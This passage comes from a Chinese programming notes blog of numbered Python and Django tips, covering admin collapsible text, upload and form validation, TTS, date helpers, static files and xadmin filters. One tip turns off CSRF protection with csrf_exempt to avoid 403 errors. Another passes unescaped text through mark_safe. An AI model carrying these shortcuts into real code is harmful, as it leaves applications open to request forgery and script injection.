type=&quot;text/javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">                    function openShutManager(oSourceObj,oTargetObj,shutAble,oOpenTip,oShutTip,oShortObj)&#123;</span><br><span class="line">                        var sourceObj = typeof oSourceObj == &quot;string&quot; ? document.getElementById(oSourceObj) : oSourceObj;</span><br><span class="line">                        var targetObj = typeof oTargetObj == &quot;string&quot; ? document.getElementById(oTargetObj) : oTargetObj;</span><br><span class="line">                        var shortObj = typeof oShortObj == &quot;string&quot; ? document.getElementById(oShortObj) : oShortObj;</span><br><span class="line">                        var openTip = oOpenTip || &quot;&quot;;</span><br><span class="line">                        var shutTip = oShutTip || &quot;&quot;;</span><br><span class="line">                        if(targetObj.style.display!=&quot;none&quot;)&#123;</span><br><span class="line">                           if(shutAble) return;</span><br><span class="line">                           targetObj.style.display=&quot;none&quot;;</span><br><span class="line">                           shortObj.style.display=&quot;block&quot;;</span><br><span class="line">                           if(openTip  &amp;&amp;  shutTip)&#123;</span><br><span class="line">                            sourceObj.innerHTML = shutTip; </span><br><span class="line">                           &#125;</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                           targetObj.style.display=&quot;block&quot;;</span><br><span class="line">                           shortObj.style.display=&quot;none&quot;;</span><br><span class="line">                           if(openTip  &amp;&amp;  shutTip)&#123;</span><br><span class="line">                            sourceObj.innerHTML = openTip; </span><br><span class="line">                           &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &lt;/script&gt;</span><br><span class="line">                    &lt;p id=&quot;%s&quot;&gt;%s&lt;/p&gt;</span><br><span class="line">                    &lt;p&gt;&lt;a href=&quot;###&quot; οnclick=&quot;openShutManager(this,&#x27;%s&#x27;,false,&#x27;点击关闭&#x27;,&#x27;点击展开&#x27;,&#x27;%s&#x27;)&quot;&gt;点击展开&lt;/a&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">                    &lt;p id=&quot;%s&quot; style=&quot;display:none&quot;&gt;</span><br><span class="line">                       %s</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &quot;&quot;&quot; % (short_id, detail_id, short_id, short_text, detail_id, short_id, detail_id, detail_text)</span><br><span class="line">        return mark_safe(text)</span><br><span class="line"></span><br><span class="line">    show_intro.short_description = &#x27;描述&#x27;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：复制代码后需要做如下修改：</p><p><img src="https://img-blog.csdnimg.cn/20200815204246956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>一开始效果</p><p><img src="https://img-blog.csdnimg.cn/20200621230038819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击展开效果：<img src="https://img-blog.csdnimg.cn/20200621230120177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="90、前端判断上传的文件是否为图片且限制大小为300kB"><a href="#90、前端判断上传的文件是否为图片且限制大小为300kB" class="headerlink" title="90、前端判断上传的文件是否为图片且限制大小为300kB"></a>90、前端判断上传的文件是否为图片且限制大小为300kB</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en-us&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body class=&quot;login&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input class=&quot;form-control input-lg&quot; id=&quot;id_icon&quot; name=&quot;icon&quot; type=&quot;file&quot; onchange=&quot;imgTypeSize(&#x27;id_icon&#x27;,300)&quot;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    //判断是否为图片，若为图片，判断其大小是否大于0.3M</span><br><span class="line">    function imgTypeSize(FileId, maxsize) &#123;</span><br><span class="line">        /*获取图片内容对象*/</span><br><span class="line">        var imgFile = document.getElementById(FileId).files[0];</span><br><span class="line">        if (imgFile.name == &quot;&quot;) &#123;</span><br><span class="line">            alert(&quot;请上传头像哦&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            /*图片类型正则验证*/</span><br><span class="line">            var imgStr = /\.(jpg|jpeg|png|bmp|BMP|JPG|PNG|JPEG)$/;</span><br><span class="line">            if (!imgStr.test(imgFile.name)) &#123;</span><br><span class="line">                alert(&quot;文件不是图片类型&quot;);</span><br><span class="line">                return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                /*图片大小*/</span><br><span class="line">                var imagSize = imgFile.size;</span><br><span class="line">                if (imagSize &lt; (1024 * maxsize)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    alert(imgFile.name + &quot;大小不能超过&quot; + maxsize + &quot;kB&quot;);</span><br><span class="line">                    document.getElementById(FileId).value = &quot;&quot;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="91、form表单提交前验证"><a href="#91、form表单提交前验证" class="headerlink" title="91、form表单提交前验证"></a>91、form表单提交前验证</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; id=&quot;login-form&quot; onsubmit=&quot;return toVaild()&quot;&gt;</span><br><span class="line">&lt;input class=&quot;form-control&quot; id=&quot;id_account&quot; name=&quot;account&quot; type=&quot;text&quot; placeholder=&quot;账号&quot;/&gt;</span><br><span class="line">&lt;input class=&quot;form-control&quot; id=&quot;id_password&quot; name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;密码&quot;&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    document.getElementById(&#x27;id_username&#x27;).focus()</span><br><span class="line"></span><br><span class="line">    function toVaild() &#123;</span><br><span class="line">        var account = document.getElementById(&quot;id_account&quot;).value;</span><br><span class="line">        var password = document.getElementById(&quot;id_password&quot;).value;</span><br><span class="line">        if (account == &quot;&quot; || password == &quot;&quot;) &#123;</span><br><span class="line">            alert(&quot;请输入账号和密码&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="92、有序字典"><a href="#92、有序字典" class="headerlink" title="92、有序字典"></a>92、有序字典</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import collections</span><br><span class="line"></span><br><span class="line">d1 = collections.OrderedDict()  # 创建一个有序字典</span><br><span class="line">d1[&#x27;a&#x27;] = &#x27;A&#x27;</span><br><span class="line">d1[&#x27;b&#x27;] = &#x27;B&#x27;</span><br><span class="line">d1[&#x27;c&#x27;] = &#x27;C&#x27;</span><br><span class="line">d1[&#x27;d&#x27;] = &#x27;D&#x27;</span><br><span class="line">for k, v in d1.items():</span><br><span class="line">    print(k, v)</span><br></pre></td></tr></table></figure><h2 id="93、Python在Windows系统下实现TTS（文字转语音）"><a href="#93、Python在Windows系统下实现TTS（文字转语音）" class="headerlink" title="93、Python在Windows系统下实现TTS（文字转语音）"></a>93、Python在Windows系统下实现TTS（文字转语音）</h2><p>导入包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install pypiwin32</span><br><span class="line"></span><br><span class="line">import win32com.client</span><br><span class="line">spk = win32com.client.Dispatch(&quot;SAPI.SpVoice&quot;)</span><br><span class="line">spk.Speak(u&quot;my name is ldc,what is your name&quot;)</span><br><span class="line">spk.Speak(u&quot;大家好&quot;)</span><br></pre></td></tr></table></figure><h2 id="94、定义一个简单闹钟"><a href="#94、定义一个简单闹钟" class="headerlink" title="94、定义一个简单闹钟"></a>94、定义一个简单闹钟</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># pip install pypiwin32 -i https://pypi.python.org/simple</span><br><span class="line">import win32com.client</span><br><span class="line">import time </span><br><span class="line">import winsound</span><br><span class="line"></span><br><span class="line">spk = win32com.client.Dispatch(&quot;SAPI.SpVoice&quot;)</span><br><span class="line"># 定义闹钟时间</span><br><span class="line">clocktime = [[19, 19], [11, 10], [12, 10], [18, 47]]  </span><br><span class="line">runinghour = 1  # 定义运行时间</span><br><span class="line">times = runinghour * 3600  # 次数</span><br><span class="line">print(times)</span><br><span class="line">for i in range(1, times):</span><br><span class="line">    time_now = [time.localtime(time.time()).tm_hour, time.localtime(time.time()).tm_min]</span><br><span class="line">    if time_now in clocktime:</span><br><span class="line">        print(time_now)</span><br><span class="line">        winsound.Beep(1000, 1000)</span><br><span class="line">        spk.Speak(u&quot;快去看下饭好了没有？&quot;)</span><br><span class="line">    time.sleep(60)  # 每分钟对比一次时间</span><br></pre></td></tr></table></figure><h2 id="95、根据年月获取当月天数"><a href="#95、根据年月获取当月天数" class="headerlink" title="95、根据年月获取当月天数"></a>95、根据年月获取当月天数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def get_month_days(year, month):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据年份，月份信息显示此月份天数</span><br><span class="line">    :param year: 年份：</span><br><span class="line">    :param month: 月份（1～12）：</span><br><span class="line">    :return: 当月天数</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if month &gt;12 or month &lt;= 0:</span><br><span class="line">        return -1</span><br><span class="line">    if month == 2:</span><br><span class="line">        return 29 if year % 4 == 0 and year % 100 != 0 or year % 400 == 0 else 28</span><br><span class="line"></span><br><span class="line">    if month in (4, 6, 9, 11):</span><br><span class="line">        return 30</span><br><span class="line">    else:</span><br><span class="line">        return 31</span><br><span class="line"></span><br><span class="line">a = &#x27;2020-04&#x27;.split(&#x27;-&#x27;)</span><br><span class="line">year = int(a[0])</span><br><span class="line">month = int(a[1])</span><br><span class="line">print(get_month_days(year,month))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">30</span><br></pre></td></tr></table></figure><h2 id="96、Django获取favicon-ico图标"><a href="#96、Django获取favicon-ico图标" class="headerlink" title="96、Django获取favicon.ico图标"></a>96、Django获取favicon.ico图标</h2><p>制作一个ico文件，使用PS或者某些在线生成ico的网站</p><p>将此文件命名为“favicon.ico”后放在static&#x2F;下</p><p><img src="https://img-blog.csdnimg.cn/20200805104730363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在urls.py中定义路由：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from django.urls import path</span><br><span class="line">from django.views.generic import RedirectView</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"># 访问favicon.ico 网站图标</span><br><span class="line">    path(&quot;favicon.ico&quot;,RedirectView.as_view(url=&#x27;static/favicon.ico&#x27;)),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="97、django-静态文件配置"><a href="#97、django-静态文件配置" class="headerlink" title="97、django 静态文件配置"></a>97、django 静态文件配置</h2><p>settings.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = &#x27;/static/&#x27;</span><br><span class="line"># 添加静态资源路由地址</span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR, &#x27;static&#x27;),</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"># 使用python manage.py collectstatic收集静态文件时时使用STATIC_ROOT</span><br><span class="line"># STATIC_ROOT = os.path.join(BASE_DIR, &#x27;static&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>urls.py</p><pre><code>from django.urls import path, re_pathfrom django.views.generic import RedirectViewfrom django.views.static import servefrom &#39;你的项目名称&#39; import settingsurlpatterns = [       path(&quot;favicon.ico&quot;,RedirectView.as_view(url=&#39;static/favicon.ico&#39;)),    re_path(&#39;static/(?P&lt;path&gt;.*)$&#39;, serve, &#123;&#39;document_root&#39;: settings.STATICFILES_DIRS[0]&#125;),    ]</code></pre><h2 id="98、django-JsonResponse返回中文时显示unicode编码（-u67e5-u8be2）"><a href="#98、django-JsonResponse返回中文时显示unicode编码（-u67e5-u8be2）" class="headerlink" title="98、django JsonResponse返回中文时显示unicode编码（\u67e5\u8be2）"></a>98、django JsonResponse返回中文时显示unicode编码（\u67e5\u8be2）</h2><p>原因<br>这个unicode编码，是python3默认返回的编码。</p><p>解决方案<br>JsonResponse里面有个参数json_dumps_params，设置为json_dumps_params&#x3D;{‘ensure_ascii’:False}即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;&#x27;msg&#x27;: &#x27;创建成功&#x27;,&#125;</span><br><span class="line">return JsonResponse(data=data, json_dumps_params=&#123;&#x27;ensure_ascii&#x27;: False&#125;)</span><br></pre></td></tr></table></figure><h2 id="99、获取当前时间月份的首日与最后一天"><a href="#99、获取当前时间月份的首日与最后一天" class="headerlink" title="99、获取当前时间月份的首日与最后一天"></a>99、获取当前时间月份的首日与最后一天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import calendar</span><br><span class="line"></span><br><span class="line">def get_month_start_and_end(date=datetime.datetime.now()):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    获取当前时间的月份首日与最后一天</span><br><span class="line">    :param date:</span><br><span class="line">    :return: (首日，最后一天)</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    year, month = str(date).split(&#x27;-&#x27;)[0], str(date).split(&#x27;-&#x27;)[1]</span><br><span class="line">    end = calendar.monthrange(int(year), int(month))[1]</span><br><span class="line">    return f&#x27;&#123;year&#125;-&#123;month&#125;-01&#x27;, f&#x27;&#123;year&#125;-&#123;month&#125;-&#123;end&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="100、xadmin后台批量操作"><a href="#100、xadmin后台批量操作" class="headerlink" title="100、xadmin后台批量操作"></a>100、xadmin后台批量操作</h2><p>adminx.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import xadmin</span><br><span class="line">from django.db.models import  Sum</span><br><span class="line">from xadmin.plugins.actions import BaseActionView</span><br><span class="line"></span><br><span class="line">class MyCountFeeAction(BaseActionView):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">        用户余额统计</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">    action_name = &quot;countuserfee&quot;  #: 相当于这个 Action 的唯一标示, 尽量用比较针对性的名字</span><br><span class="line">    description = u&#x27;统计用户总余额&#x27;  #: 描述, 出现在 Action 菜单中, 可以使用 ``%(verbose_name_plural)s`` 代替 Model 的名字.</span><br><span class="line">    model_perm = &#x27;view&#x27;  # 权限</span><br><span class="line"></span><br><span class="line">    def do_action(self, queryset):</span><br><span class="line">        all_balance = MallUser.objects.all().aggregate(Sum(&#x27;balance&#x27;))</span><br><span class="line">        return HttpResponse(f&#x27;用户总余额&#123;all_balance&#125;&#x27;)</span><br><span class="line">class UserAdmin(object):</span><br><span class="line">    &quot;&quot;&quot;用户信息管理&quot;&quot;&quot;</span><br><span class="line">    list_display = [&#x27;username&#x27;, &#x27;balance&#x27;, &#x27;status&#x27;, &#x27;addtime&#x27;]</span><br><span class="line">    search_fields = [&#x27;username&#x27;, ]</span><br><span class="line">    list_filter = [&#x27;status&#x27;, &#x27;addtime&#x27;]</span><br><span class="line">    list_per_page = 30  # 默认每页数量</span><br><span class="line">    model_icon = &#x27;fa fa-user&#x27;</span><br><span class="line">    list_editable = [&#x27;status&#x27;]</span><br><span class="line">    ordering = [&#x27;-addtime&#x27;]</span><br><span class="line">    actions = [ MyCountFeeAction]  # 添加批量选择操作</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200812233442373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="101、xadmin过滤器外键显示特定值（比如只能过滤自己与超级管理员定义的数据）"><a href="#101、xadmin过滤器外键显示特定值（比如只能过滤自己与超级管理员定义的数据）" class="headerlink" title="101、xadmin过滤器外键显示特定值（比如只能过滤自己与超级管理员定义的数据）"></a>101、xadmin过滤器外键显示特定值（比如只能过滤自己与超级管理员定义的数据）</h2><p>首先，修改xadmin源码，修改xadmin&#x2F;filters.py,在401行，做如下修改，</p><pre><code>把self.lookup_choices = field.get_choices(include_blank=False)改为：# 调用自定义的方法if hasattr(model_admin, &#39;&#123;field&#125;_choices&#39;.format(field=field.name)):        self.lookup_choices = getattr(model_admin, &#39;&#123;field&#125;_choices&#39;.format(field=field.name))(field, request,params, model,model_admin,field_path)    else:        self.lookup_choices = field.get_choices(include_blank=False)</code></pre><p>如图:</p><p><img src="https://img-blog.csdnimg.cn/20200812234011656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>然后，在adminx.py中定义过滤的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import xadmin</span><br><span class="line">from django.db.models import  Q, Sum</span><br><span class="line">from xadmin.plugins.actions import BaseActionView</span><br><span class="line"></span><br><span class="line">class MeasurePointAdmin(object):</span><br><span class="line">    # search_fields = [&#x27;user__name&#x27;, &#x27;user__account&#x27;]  # 检索字段</span><br><span class="line">    list_display = [&#x27;num&#x27;, &#x27;elevation&#x27;, &#x27;correct_num&#x27;, &#x27;cumulative_amount&#x27;]</span><br><span class="line">    list_filter = [&#x27;user&#x27;, &#x27;is_default&#x27;, &#x27;create_time&#x27;]  # 分组过滤的字段</span><br><span class="line">    list_editable = [&#x27;num&#x27;, &#x27;elevation&#x27;, &#x27;correct_num&#x27;, &#x27;cumulative_amount&#x27;]</span><br><span class="line">    ordering = (&#x27;id&#x27;,)  # 设置默认排序字段，负号表示降序排序</span><br><span class="line">    list_per_page = 30  # 默认每页显示多少条记录，默认是100条</span><br><span class="line">    model_icon = &#x27;fa fa-users&#x27;  # 左侧小图标</span><br><span class="line">    readonly_fields = [&#x27;user&#x27;, &#x27;is_default&#x27;]</span><br><span class="line">    import_excel = True</span><br><span class="line">    actions = [MyCountFeeAction]</span><br><span class="line"></span><br><span class="line"># 定义的函数名必须是  字段名_choices</span><br><span class="line">    def user_choices(self, field, request, params, model, model_admin, field_path):</span><br><span class="line">        # 超级用户不做控制</span><br><span class="line">        if self.request.user.is_superuser:</span><br><span class="line">            return field.get_choices(include_blank=False)</span><br><span class="line"></span><br><span class="line">        # 过滤器只显示自己与超级管理员</span><br><span class="line">        user_lst = field.related_model._default_manager.filter(Q(id=self.request.user.id) | Q(is_superuser=True))</span><br><span class="line">        # 返回格式 [(&#x27;pk&#x27;,&#x27;标题&#x27;),]</span><br><span class="line">        return [(user.id, user.username) for user in user_lst]</span><br></pre></td></tr></table></figure><p>效果:</p><p><img src="https://img-blog.csdnimg.cn/2020081223440761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="102、Django中的CSRF局部禁用"><a href="#102、Django中的CSRF局部禁用" class="headerlink" title="102、Django中的CSRF局部禁用"></a>102、Django中的CSRF局部禁用</h2><p>为了避免没有csrf token而产生的403的forbidden错误，可以使用csrf_exempt装饰器来处理POST、GET请求的View, 这种方式是CSRF局部禁用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from django.utils.decorators import method_decorator</span><br><span class="line">from django.views.decorators.csrf import csrf_exempt</span><br><span class="line"></span><br><span class="line">@method_decorator(csrf_exempt)</span><br><span class="line">def update_data(request):</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">    pass</span><br><span class="line">elif request.method == &#x27;GET&#x27;:</span><br><span class="line">    pass</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="103、使用python命令创建django项目"><a href="#103、使用python命令创建django项目" class="headerlink" title="103、使用python命令创建django项目"></a>103、使用python命令创建django项目</h2><p>创建django项目<br>方式一：直接打开pycharm创建，选择file-&gt;new project-&gt;django<br>方式二：通过命令创建<br>先创建虚拟环境：python -m venv django_venv<br>然后导入django库：pip install django -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a><br>最后使用命令创建：django-admin startproject my_django_project</p><h2 id="104、-二维列表、二维数组行求和与列求和"><a href="#104、-二维列表、二维数组行求和与列求和" class="headerlink" title="104、 二维列表、二维数组行求和与列求和"></a>104、 二维列表、二维数组行求和与列求和</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">from functools import reduce</span><br><span class="line"></span><br><span class="line"># 二维数组，对列和行求和</span><br><span class="line">a = [</span><br><span class="line">    [&#x27;&#x27;, 0, &#x27;&#x27;, 1, 4.1],</span><br><span class="line">    [&#x27;&#x27;, 0, &#x27;&#x27;, &#x27;&#x27;, 4],</span><br><span class="line">    [&#x27;123&#x27;, 0, &#x27;&#x27;, 3, 4, 6,7],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def aa(x, y):</span><br><span class="line">    x = 0 if isinstance(x, str) else x</span><br><span class="line">    y = 0 if isinstance(y, str) else y</span><br><span class="line">    return x + y</span><br><span class="line"></span><br><span class="line"># 对行求和</span><br><span class="line">row_sum = [reduce(aa, i) for i in a]</span><br><span class="line"># 对列求和，只能处理相同长度的子元素</span><br><span class="line">column_sum_1 = [reduce(aa, i) for i in zip(*a)]</span><br><span class="line"># 对列求和，可以处理不同长度的子元素</span><br><span class="line">column_sum_2 = list(dict(pd.DataFrame(a).fillna(0).apply(lambda x: &#x27;&#x27; if any(isinstance(d, str) for d in x) else round(x.sum(), 2))).values())</span><br><span class="line">print(&#x27;行求和：&#123;&#125;\r\n列求和(相同长度)：&#123;&#125;\r\n列求和：&#123;&#125;&#x27;.format(row_sum, column_sum_1, column_sum_2))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">行求和：[5.1, 4, 20]</span><br><span class="line">列求和(相同长度)：[0, 0, 0, 4, 12.1]</span><br><span class="line">列求和：[&#x27;&#x27;, 0, &#x27;&#x27;, &#x27;&#x27;, 12.1, 6.0, 7.0]</span><br></pre></td></tr></table></figure><h2 id="105、获取时间字符串的月份数"><a href="#105、获取时间字符串的月份数" class="headerlink" title="105、获取时间字符串的月份数"></a>105、获取时间字符串的月份数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 